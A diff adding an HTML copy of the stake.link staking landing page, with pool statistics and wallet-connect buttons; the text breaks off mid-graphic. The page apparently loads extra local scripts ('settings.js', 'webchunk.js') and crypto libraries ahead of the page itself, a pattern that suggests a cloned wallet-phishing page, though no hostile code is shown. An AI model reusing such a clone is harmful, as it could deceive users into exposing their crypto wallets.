@@ -1,0 +1,1113 @@
+<html lang="en" style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;">
+ <head>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta charset="utf-8"/>
+  <meta content="
+      script-src 'self' *.googletagmanager.com *.gstatic.com *.googleapis.com *.trackjs.com polyfill.io cdn.jsdelivr.net 'unsafe-inline';
+      style-src 'self' *.googleapis.com *.googletagmanager.com 'unsafe-inline';
+      object-src 'none'" http-equiv="Content-Security-Policy"/>
+  <!-- Google tag (gtag.js) -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-43S4Y1N2G5">
+  </script>
+  <script>
+   window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+
+      gtag('config', 'G-43S4Y1N2G5')
+  </script>
+  <script id="env-vars">
+   var GLOBAL_STAKING_UI_CORE_API_URL="https://stake.link";
+			var GLOBAL_STAKING_UI_MERKLE_API_URL="https://stake.link";
+			var GLOBAL_STAKING_UI_ALLOWED_CHAIN_IDS="1";
+			var GLOBAL_STAKING_UI_TESTING_MODE="false";
+			var GLOBAL_STAKING_UI_RPC_HTTP="undefined";
+			var GLOBAL_STAKING_UI_RPC_WEBSOCKET="undefined";
+			var GLOBAL_STAKING_UI_IPFS_URL="https://bronze-elderly-halibut-521.mypinata.cloud/ipfs";
+			var GLOBAL_STAKING_UI_CHATBOT_API_URL="https://stake.link/sergai";
+			var GLOBAL_STAKING_UI_CHATBOT_DEV_MODE="false";
+			var GLOBAL_STAKING_UI_TESTNET_BLOCK_EXPLORER_URL="undefined";
+			var GLOBAL_STAKING_UI_ALLOWED_FEATURES="LINK_SDL_UNISWAP";
+			var GLOBAL_STAKING_UI_LINK_SDL_UNISWAP_INCENTIVE_ID="0x787083a8c9b0aa43ae61ad986eff5744db7fef45c7bd9105875508b4a296d417";
+			var GLOBAL_STAKING_UI_LINK_SDL_UNISWAP_SUBGRAPH_URL="https://api.thegraph.com/subgraphs/name/stakedotlink/sdl-link-uniswap-staking";
+  </script>
+  <!-- 
+    <script src="https://cdn.trackjs.com/agent/v3/latest/t.js"></script>
+    <script>
+      if (location.hostname !== 'localhost') {
+        TrackJS.install({
+          token: 'c82f9d4ce569451cbc49d7e5dc4af806',
+          application: 'stakelink'
+          // for more configuration options, see https://docs.trackjs.com
+        })
+      }
+    </script> -->
+  <link href="/favicon.ico" rel="icon" sizes="32x32" type="image/png"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Liquid Staking for the Chainlink Ecosystem - stake.link
+  </title>
+  <meta content="stake.link is the only liquid staking protocol for the Chainlink ecosystem. Stake LINK, secure the network, earn rewards, enable DeFi composability." data-react-helmet="true" name="description"/>
+  <meta content="stake.link" name="author"/>
+  <meta content="liquid staking protocol" data-react-helmet="true" name="keywords"/>
+  <meta content="Liquid Staking for the Chainlink Ecosystem - stake.link" data-react-helmet="true" property="og:title"/>
+  <meta content="stake.link is the only liquid staking protocol for the Chainlink ecosystem. Stake LINK, secure the network, earn rewards, enable DeFi composability." data-react-helmet="true" property="og:description"/>
+  <meta content="https://stake.link/" property="og:url"/>
+  <meta content="https://stake.link/og.png" property="og:image"/>
+  <meta content="https://stake.link/og.png" property="og:image:secure_url"/>
+  <meta content="1920" property="og:image:width"/>
+  <meta content="1080" property="og:image:height"/>
+  <meta content="image/png" property="og:image:type"/>
+  <meta content="Liquid Staking for the Chainlink Ecosystem - stake.link" data-react-helmet="true" property="og:image:alt"/>
+  <meta content="summary_large_image" name="twitter:card"/>
+  <meta content="@stakedotlink" name="twitter:site"/>
+  <meta content="@stakedotlink" name="twitter:creator"/>
+  <meta content="Liquid Staking for the Chainlink Ecosystem - stake.link" data-react-helmet="true" name="twitter:title"/>
+  <meta content="stake.link is the only liquid staking protocol for the Chainlink ecosystem. Stake LINK, secure the network, earn rewards, enable DeFi composability." data-react-helmet="true" name="twitter:description"/>
+  <script>
+   global = globalThis
+  </script>
+  <!-- <script
+      crossorigin="anonymous"
+      src="https://polyfill.io/v3/polyfill.min.js?features=Intl.NumberFormat"></script> -->
+  <script crossorigin="" src="/assets/index.js" type="module">
+  </script>
+  <link href="/assets/bn.js" rel="modulepreload"/>
+  <link href="/assets/vendor.js" rel="modulepreload"/>
+  <link href="/assets/ethers.js" rel="modulepreload"/>
+  <link href="/assets/index.css" rel="stylesheet"/>
+  <link as="script" crossorigin="" href="/assets/index.es.js" rel="modulepreload"/>
+  <link as="script" crossorigin="" href="/assets/events.js" rel="modulepreload"/>
+  <link as="script" crossorigin="" href="/assets/provider.js" rel="modulepreload"/>
+  <style data-styled="active" data-styled-version="5.3.10">
+  </style>
+  <meta content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9" http-equiv="origin-trial"/>
+  <link as="script" crossorigin="" href="/assets/index5.js" rel="modulepreload"/>
+  <link as="script" crossorigin="" href="/assets/index.js" rel="modulepreload"/>
+  <link as="script" crossorigin="" href="/assets/index6.js" rel="modulepreload"/>
+  <link as="script" crossorigin="" href="/assets/browser.js" rel="modulepreload"/>
+  <link as="script" crossorigin="" href="/assets/index4.js" rel="modulepreload"/>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body class="xstyled-color-mode-dark">
+  <!-- Google Tag Manager (noscript) -->
+  <noscript>
+   <iframe height="0" src="https://www.googletagmanager.com/gtag/js?id=G-43S4Y1N2G5" style="display: none; visibility: hidden" width="0">
+   </iframe>
+  </noscript>
+  <!-- End Google Tag Manager (noscript) -->
+  <noscript>
+   You need to enable JavaScript to run this app.
+  </noscript>
+  <div id="root">
+   <div data-rk="">
+    <style>
+     [data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:Lato;--rk-radii-actionButton:9999px;--rk-radii-connectButton:0;--rk-radii-menuButton:12px;--rk-radii-modal:0;--rk-radii-modalMobile:28px;--rk-colors-accentColor:#3c43ea;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(255, 255, 255, 0.04);--rk-colors-actionButtonBorderMobile:rgba(255, 255, 255, 0.08);--rk-colors-actionButtonSecondaryBackground:rgba(255, 255, 255, 0.08);--rk-colors-closeButton:rgba(224, 232, 255, 0.6);--rk-colors-closeButtonBackground:rgba(255, 255, 255, 0.08);--rk-colors-connectButtonBackground:transparent;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));--rk-colors-connectButtonText:#FFF;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(255, 255, 255, 0.08);--rk-colors-generalBorderDim:rgba(255, 255, 255, 0.04);--rk-colors-menuItemBackground:rgba(224, 232, 255, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.5);--rk-colors-modalBackground:#1A1B1F;--rk-colors-modalBorder:rgba(255, 255, 255, 0.08);--rk-colors-modalText:#FFF;--rk-colors-modalTextDim:rgba(224, 232, 255, 0.3);--rk-colors-modalTextSecondary:rgba(255, 255, 255, 0.6);--rk-colors-profileAction:rgba(224, 232, 255, 0.1);--rk-colors-profileActionHover:rgba(224, 232, 255, 0.2);--rk-colors-profileForeground:rgba(224, 232, 255, 0.05);--rk-colors-selectedOptionBorder:rgba(224, 232, 255, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}
+    </style>
+    <main class="sc-iWxGtA ejhfcj">
+     <div class="sc-ccVCaX cSinhJ">
+      <div class="sc-ccVCaX dpUtpt">
+       <button class="sc-jJTsDX iMbxDC connectButton" type="button">
+        <svg aria-hidden="true" class="sc-eePZqt gPtRME" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+         <path d="M30.94,15.66A16.69,16.69,0,0,0,16,5,16.69,16.69,0,0,0,1.06,15.66a1,1,0,0,0,0,.68A16.69,16.69,0,0,0,16,27,16.69,16.69,0,0,0,30.94,16.34,1,1,0,0,0,30.94,15.66ZM16,25c-5.3,0-10.9-3.93-12.93-9C5.1,10.93,10.7,7,16,7s10.9,3.93,12.93,9C26.9,21.07,21.3,25,16,25Z">
+         </path>
+         <path d="M16,10a6,6,0,1,0,6,6A6,6,0,0,0,16,10Zm0,10a4,4,0,1,1,4-4A4,4,0,0,1,16,20Z">
+         </path>
+        </svg>
+       </button>
+       <div class="sc-ccVCaX sc-jyRBQx VJYaj">
+        <div class="iekbcc0 ju367va ju367v1s" style="">
+         <button class="iekbcc0 iekbcc9 ju367v78 ju367v7t ju367v9h ju367vn ju367veh ju367vf2 ju367v16 ju367v1h ju367v2g ju367v8t _12cbo8i3 ju367v8r _12cbo8i4 _12cbo8i6 connectButton" data-testid="rk-connect-button" type="button">
+          Connect Wallet
+         </button>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="sc-ccVCaX fBsJnm">
+      <header class="sc-dEsUz kHwtOR">
+       <div class="sc-ccVCaX ioqLkR">
+        <div class="sc-ccVCaX cSNRLO">
+         <a aria-label="Stake.link Home" class="sc-jJTsDX kcPNVJ">
+          <svg class="sc-eePZqt keHeOd" height="1em" viewbox="0 0 200 200" width="1em" xmlns="http://www.w3.org/2000/svg">
+           <path class="sc-daSpeN hWOzPl" d="M176.311 38.8686L116.021 4.05758C106.647 -1.35253 95.1041 -1.35253 85.7303 4.05758L52.6577 25.8093C42.4772 31.6783 42.4772 46.3788 52.6577 52.2478L107.677 85.1813C117.092 90.6192 122.906 100.675 122.906 111.564V120.326L122.753 120.229L123.712 161.938L97.3571 177.181L52.9915 151.744C40.4467 144.553 32.5471 131.369 32.116 116.919L31.6431 101.342L97.6214 139.755L95.118 107.907L8 57.6301L10.2252 126.599C10.2252 142.523 18.7229 157.237 32.5054 165.206L85.7303 195.942C95.1041 201.353 106.647 201.353 116.021 195.942L136.549 184.093C142.529 180.644 146.201 174.26 146.201 167.362V148.406L145.394 100.369C145.394 89.8265 139.943 80.0216 130.972 74.4724L76.7737 39.87L102.433 22.1237L154.337 54.0697C163.321 59.5911 168.801 69.3821 168.829 79.9242L168.926 143.733L191.512 130.854V65.2515C191.512 54.3618 185.699 44.3065 176.283 38.8686H176.311Z">
+           </path>
+          </svg>
+          <span class="sc-kGRGSO cKFKCe">
+           stake.link
+          </span>
+         </a>
+         <nav aria-label="Main Navigation" class="sc-eeGUxP feMioD" role="navigation">
+          <ul class="sc-ipBWOJ fvtFGG">
+           <li class="sc-gCkVGe jMVaOM">
+            <a class="sc-jJTsDX eJPSM">
+             Home
+            </a>
+           </li>
+           <li class="sc-gCkVGe jMVaOM">
+            <a class="sc-jJTsDX dguUOc">
+             Pools
+            </a>
+           </li>
+           <li class="sc-gCkVGe jMVaOM">
+            <a class="sc-jJTsDX dguUOc">
+             Assets
+            </a>
+           </li>
+           <li class="sc-gCkVGe jMVaOM">
+            <a class="sc-jJTsDX dguUOc">
+             Swap
+            </a>
+           </li>
+          </ul>
+         </nav>
+        </div>
+       </div>
+      </header>
+      <section class="sc-hKhKOZ hNyrkP">
+       <div class="sc-ccVCaX ZXdnQ">
+        <img alt="Hero" class="sc-fwEaKe jjBkxI" src="/assets/hero.webp"/>
+        <p class="sc-iHDLbo jZQwBV">
+         Liquid Staking for the Chainlink Ecosystem
+        </p>
+        <h2 class="sc-emqRaN bhEPni">
+         Stake Assets
+         <br/>
+         Secure Networks
+         <br/>
+         Receive Rewards
+        </h2>
+        <h1 class="sc-iHDLbo dsMUgG">
+         Effortlessly stake your crypto assets with stake.link’s easy to use, secure liquid staking protocol
+        </h1>
+        <a class="sc-jJTsDX hfzepM">
+         Stake Now
+        </a>
+       </div>
+      </section>
+     </div>
+     <section class="sc-hKhKOZ kwVAvY">
+      <div class="sc-ccVCaX bkuIvf">
+       <div class="sc-ccVCaX kXRedy">
+        <p class="sc-iHDLbo cuVQuK">
+         Total Value Locked (TVL)
+        </p>
+        <h2 class="sc-emqRaN jwfUGT">
+         $ 37,416,494
+        </h2>
+       </div>
+       <div class="sc-ccVCaX kXRedy">
+        <p class="sc-iHDLbo cuVQuK">
+         Total Rewards
+        </p>
+        <h2 class="sc-emqRaN jwfUGT">
+         $ 1,602,777
+        </h2>
+       </div>
+       <div class="sc-ccVCaX kXRedy">
+        <p class="sc-iHDLbo cuVQuK">
+         Total Users
+        </p>
+        <h2 class="sc-emqRaN jwfUGT">
+         1,159
+        </h2>
+       </div>
+      </div>
+     </section>
+     <section class="sc-hKhKOZ bXtVdT" width="100%">
+      <header class="sc-dEsUz">
+       <h2 class="sc-emqRaN hcMwjc">
+        Staking Pools
+       </h2>
+       <p class="sc-iHDLbo jFhFZX">
+        Start staking LINK and SDL by selecting a pool below.
+       </p>
+      </header>
+      <section class="sc-hKhKOZ flGGeM">
+       <div class="sc-ccVCaX kxlVLR">
+        <div class="sc-ccVCaX gjBizU">
+         <svg class="sc-eePZqt foUtzm" height="1em" viewbox="0 0 64 64" width="1em">
+          <path clip-rule="evenodd" d="M31.9808 13.547L16 22.7735V41.2265L31.9808 50.453L47.9615 41.2265V22.7735L31.9808 13.547ZM57.9615 17L31.9808 2L6 17V47L31.9808 62L57.9615 47V17Z" fill="white" fill-rule="evenodd">
+          </path>
+         </svg>
+         <div class="sc-ccVCaX">
+          <p class="sc-iHDLbo gBYZiF">
+           Staking Pool
+          </p>
+          <h3 class="sc-dSbvwS gLQBTP">
+           LINK Pool
+          </h3>
+         </div>
+        </div>
+        <span class="sc-kGRGSO jrCrok">
+        </span>
+        <div class="sc-ccVCaX fCCknu">
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Reward Rate
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            8.36 %
+           </p>
+           <svg aria-hidden="true" class="sc-eePZqt dvjwOv" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17 22L17 14 13 14 13 16 15 16 15 22 12 22 12 24 20 24 20 22 17 22zM16 8a1.5 1.5 0 101.5 1.5A1.5 1.5 0 0016 8z">
+            </path>
+            <path d="M16,30A14,14,0,1,1,30,16,14,14,0,0,1,16,30ZM16,4A12,12,0,1,0,28,16,12,12,0,0,0,16,4Z">
+            </path>
+           </svg>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Total Priority Pool LINK
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            547,315.95 LINK
+           </p>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Total Staked
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            1,290,253.27 LINK
+           </p>
+          </div>
+         </section>
+        </div>
+        <div class="sc-ccVCaX ijxzoq">
+         <div class="sc-ccVCaX etLYct">
+         </div>
+         <p class="sc-ksNGjt kVbspK">
+          Stake your LINK, receive stLINK, and earn staking rewards. Stakers may qualify for BUILD incentives.
+         </p>
+         <div class="sc-ccVCaX dhItsT">
+          <a class="sc-jJTsDX cnrWmO">
+           Stake LINK
+           <svg aria-hidden="true" class="sc-eePZqt iWFzTT" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22 16L12 26 10.6 24.6 19.2 16 10.6 7.4 12 6z">
+            </path>
+           </svg>
+          </a>
+         </div>
+        </div>
+       </div>
+       <div class="sc-ccVCaX kxlVLR">
+        <div class="sc-ccVCaX gjBizU">
+         <svg class="sc-eePZqt foUtzm" height="1em" viewbox="0 0 200 200" width="1em" xmlns="http://www.w3.org/2000/svg">
+          <path class="sc-daSpeN hWOzPl" d="M176.311 38.8686L116.021 4.05758C106.647 -1.35253 95.1041 -1.35253 85.7303 4.05758L52.6577 25.8093C42.4772 31.6783 42.4772 46.3788 52.6577 52.2478L107.677 85.1813C117.092 90.6192 122.906 100.675 122.906 111.564V120.326L122.753 120.229L123.712 161.938L97.3571 177.181L52.9915 151.744C40.4467 144.553 32.5471 131.369 32.116 116.919L31.6431 101.342L97.6214 139.755L95.118 107.907L8 57.6301L10.2252 126.599C10.2252 142.523 18.7229 157.237 32.5054 165.206L85.7303 195.942C95.1041 201.353 106.647 201.353 116.021 195.942L136.549 184.093C142.529 180.644 146.201 174.26 146.201 167.362V148.406L145.394 100.369C145.394 89.8265 139.943 80.0216 130.972 74.4724L76.7737 39.87L102.433 22.1237L154.337 54.0697C163.321 59.5911 168.801 69.3821 168.829 79.9242L168.926 143.733L191.512 130.854V65.2515C191.512 54.3618 185.699 44.3065 176.283 38.8686H176.311Z">
+          </path>
+         </svg>
+         <div class="sc-ccVCaX">
+          <p class="sc-iHDLbo gBYZiF">
+           Staking Pool
+          </p>
+          <h3 class="sc-dSbvwS gLQBTP">
+           SDL Pool
+          </h3>
+         </div>
+        </div>
+        <span class="sc-kGRGSO jrCrok">
+        </span>
+        <div class="sc-ccVCaX fCCknu">
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Reward Rate
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            4.57 %
+           </p>
+           <svg aria-hidden="true" class="sc-eePZqt dvjwOv" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17 22L17 14 13 14 13 16 15 16 15 22 12 22 12 24 20 24 20 22 17 22zM16 8a1.5 1.5 0 101.5 1.5A1.5 1.5 0 0016 8z">
+            </path>
+            <path d="M16,30A14,14,0,1,1,30,16,14,14,0,0,1,16,30ZM16,4A12,12,0,1,0,28,16,12,12,0,0,0,16,4Z">
+            </path>
+           </svg>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Total Rewards
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            14,183.79 stLINK
+           </p>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Total Staked
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            19,063,195.49 SDL
+           </p>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Total Staked (NFT)
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            124,341,508.58 reSDL
+           </p>
+          </div>
+         </section>
+        </div>
+        <div class="sc-ccVCaX ijxzoq">
+         <div class="sc-ccVCaX etLYct">
+         </div>
+         <p class="sc-ksNGjt kVbspK">
+          Stake your SDL to secure priority access to LINK staking, and earn rewards from protocol fees.
+         </p>
+         <div class="sc-ccVCaX dhItsT">
+          <a class="sc-jJTsDX cnrWmO">
+           Stake SDL
+           <svg aria-hidden="true" class="sc-eePZqt iWFzTT" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22 16L12 26 10.6 24.6 19.2 16 10.6 7.4 12 6z">
+            </path>
+           </svg>
+          </a>
+         </div>
+        </div>
+       </div>
+       <div class="sc-ccVCaX kxlVLR">
+        <div class="sc-ccVCaX gjBizU">
+         <svg class="sc-eePZqt grkKTk" height="1em" viewbox="0 0 200 200" width="1em" xmlns="http://www.w3.org/2000/svg">
+          <g clip-path="url(#clip0_4055_270)">
+           <path d="M81.4901 48.4632C79.4064 48.1675 79.3071 48.069 80.2994 47.9704C82.1847 47.6747 86.5507 48.069 89.6268 48.7589C96.7712 50.4343 103.221 54.7707 110.068 62.3595L111.854 64.4291L114.434 64.0349C125.448 62.2609 136.76 63.6407 146.187 67.9771C148.766 69.1598 152.835 71.5251 153.331 72.1164C153.529 72.3136 153.827 73.5948 154.025 74.876C154.72 79.5081 154.422 82.9575 152.934 85.6185C152.14 87.0968 152.14 87.4911 152.636 88.7723C153.033 89.7578 154.224 90.4477 155.315 90.4477C157.697 90.4477 160.178 86.7026 161.368 81.4792L161.864 79.4095L162.758 80.3951C167.818 86.0127 171.787 93.7986 172.383 99.3177L172.581 100.796L171.688 99.5148C170.2 97.248 168.81 95.7697 166.925 94.4885C163.551 92.2217 159.979 91.5318 150.553 91.039C142.019 90.5463 137.157 89.8564 132.394 88.2795C124.257 85.6185 120.09 82.1691 110.465 69.4555C106.198 63.8378 103.519 60.7826 100.84 58.2202C94.9851 52.6025 89.1307 49.6459 81.4901 48.4632Z" fill="white">
+           </path>
+           <path d="M155.415 60.9793C155.614 57.2342 156.11 54.7703 157.201 52.5036C157.598 51.6166 157.995 50.8281 158.094 50.8281C158.194 50.8281 157.995 51.518 157.697 52.3065C156.904 54.4747 156.804 57.5299 157.3 60.9793C157.995 65.4143 158.293 66.0056 163.056 70.8348C165.239 73.1016 167.819 75.9597 168.811 77.1424L170.498 79.3106L168.811 77.7337C166.727 75.7626 161.964 72.0175 160.873 71.5247C160.178 71.1305 160.079 71.1305 159.583 71.6233C159.186 72.0175 159.087 72.6088 159.087 75.4669C158.987 79.9019 158.392 82.6615 156.904 85.5196C156.11 86.9979 156.011 86.7022 156.705 85.0268C157.201 83.7456 157.3 83.1542 157.3 78.9164C157.3 70.3421 156.308 68.2724 150.255 64.823C148.767 63.936 146.187 62.6547 144.699 61.9649C143.111 61.275 141.92 60.6836 142.019 60.6836C142.218 60.4865 148.072 62.162 150.355 63.1475C153.828 64.5273 154.423 64.6259 154.82 64.5273C155.117 64.2316 155.316 63.4432 155.415 60.9793Z" fill="white">
+           </path>
+           <path d="M85.5585 75.6643C81.391 69.9481 78.7118 61.0781 79.3072 54.4749L79.5056 52.4053L80.4979 52.6024C82.284 52.8981 85.3601 54.0807 86.8485 54.9677C90.8176 57.333 92.6037 60.5854 94.2906 68.6669C94.7867 71.0322 95.4813 73.7918 95.779 74.6788C96.2751 76.1571 98.1604 79.6065 99.7481 81.7747C100.84 83.3516 100.145 84.1401 97.6643 83.9429C93.8936 83.5487 88.833 80.0993 85.5585 75.6643Z" fill="white">
+           </path>
+           <path d="M150.355 118.536C130.708 110.651 123.762 103.851 123.762 92.3199C123.762 90.6444 123.861 89.2646 123.861 89.2646C123.96 89.2646 124.655 89.856 125.548 90.5459C129.517 93.6996 133.982 95.0794 146.386 96.8534C153.629 97.9375 157.797 98.726 161.567 100.007C173.574 103.949 181.016 112.031 182.802 122.971C183.298 126.124 183.001 132.136 182.207 135.29C181.512 137.754 179.528 142.287 179.031 142.386C178.932 142.386 178.734 141.893 178.734 141.105C178.535 136.965 176.452 133.023 172.979 129.968C168.811 126.42 163.453 123.759 150.355 118.536Z" fill="white">
+           </path>
+           <path d="M136.462 121.788C136.264 120.309 135.767 118.437 135.47 117.648L134.974 116.17L135.867 117.254C137.157 118.732 138.149 120.506 139.042 122.97C139.737 124.843 139.737 125.434 139.737 128.489C139.737 131.446 139.637 132.136 139.042 133.811C138.05 136.472 136.859 138.345 134.874 140.414C131.302 144.061 126.639 146.032 119.99 146.919C118.8 147.018 115.426 147.313 112.449 147.51C105.007 147.905 100.046 148.693 95.5803 150.27C94.985 150.467 94.3896 150.664 94.2904 150.566C94.0919 150.369 97.168 148.595 99.6487 147.412C103.122 145.736 106.694 144.849 114.533 143.47C118.403 142.878 122.372 142.09 123.364 141.696C133.188 138.641 138.05 131.052 136.462 121.788Z" fill="white">
+           </path>
+           <path d="M145.492 137.656C142.912 132.038 142.317 126.716 143.706 121.69C143.904 121.197 144.103 120.704 144.301 120.704C144.5 120.704 145.095 121 145.69 121.394C146.881 122.182 149.362 123.562 155.712 127.012C163.75 131.348 168.314 134.699 171.49 138.543C174.268 141.893 175.955 145.737 176.749 150.468C177.245 153.129 176.947 159.535 176.253 162.196C174.07 170.573 169.108 177.275 161.865 181.118C160.773 181.71 159.88 182.104 159.781 182.104C159.682 182.104 160.078 181.118 160.674 179.936C163.055 174.909 163.353 170.08 161.567 164.66C160.475 161.309 158.193 157.268 153.629 150.468C148.171 142.583 146.881 140.514 145.492 137.656Z" fill="white">
+           </path>
+           <path d="M71.5682 167.813C78.911 161.703 87.9407 157.366 96.2758 155.986C99.848 155.395 105.802 155.592 109.076 156.479C114.335 157.859 119.098 160.816 121.579 164.462C123.96 168.01 125.052 171.065 126.143 177.866C126.54 180.527 127.036 183.286 127.136 183.878C127.929 187.426 129.517 190.185 131.502 191.663C134.578 193.93 139.936 194.029 145.195 192.058C146.088 191.762 146.882 191.466 146.882 191.565C147.08 191.762 144.401 193.536 142.615 194.423C140.134 195.704 138.15 196.098 135.471 196.098C130.708 196.098 126.639 193.635 123.365 188.707C122.67 187.721 121.281 184.863 120.09 182.202C116.617 174.219 114.831 171.854 110.763 169.193C107.191 166.926 102.626 166.433 99.1534 168.109C94.5889 170.277 93.3982 176.092 96.5735 179.64C97.8635 181.118 100.245 182.301 102.229 182.596C105.901 183.089 109.076 180.231 109.076 176.584C109.076 174.219 108.183 172.839 105.802 171.755C102.626 170.376 99.1534 171.952 99.2526 175.008C99.2526 176.289 99.848 177.077 101.138 177.669C101.932 178.063 101.932 178.063 101.336 177.964C98.4588 177.373 97.7642 173.825 100.046 171.558C102.825 168.799 108.679 169.981 110.664 173.825C111.458 175.402 